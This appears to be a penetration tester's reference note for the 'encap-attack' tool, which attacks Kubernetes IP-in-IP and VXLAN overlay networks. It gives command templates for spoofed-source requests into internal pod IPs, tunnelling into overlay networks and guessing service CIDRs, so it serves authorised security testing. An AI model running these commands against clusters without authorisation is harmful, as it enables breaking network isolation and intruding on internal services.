---
tags: [tool, kubernetes, network, exploitation]
tool: "encap-attack"
category: "Kubernetes"
installed: true
phase: [exploitation, pivoting]
---

# encap-attack - Network Encapsulation Exploitation

## Tool Overview
Purpose: Attack IP-in-IP and VXLAN encapsulated networks
Location: /usr/local/bin/encap-attack

## When to Use
- Kubernetes overlay network attacks
- Breaking out of network isolation
- Creating tunnels into encapsulated networks
- Sniffing cross-pod traffic

## Why This Tool
**Strengths:**
- Detects encapsulated traffic patterns
- Guesses Kubernetes service CIDRs
- Creates tunnels into overlay networks
- Sends DNS/HTTP requests into encapsulated networks

## How to Use It

### Detect Encapsulated Traffic
encap-attack detect

### Guess Kubernetes Service CIDR
encap-attack kubeintel guess-cidr <api_server>

### Attack with IP-in-IP
encap-attack ipip -d <destination_host> -s <spoofed_ip> request -di <internal_ip> dns -t A google.com

### Create Tunnel
encap-attack ipip -d <destination_host> -s <spoofed_ip> tunnel -a <api_server> -r <route_cidr>

### Help
encap-attack --help

## Related Tools
peirates, kube-hunter
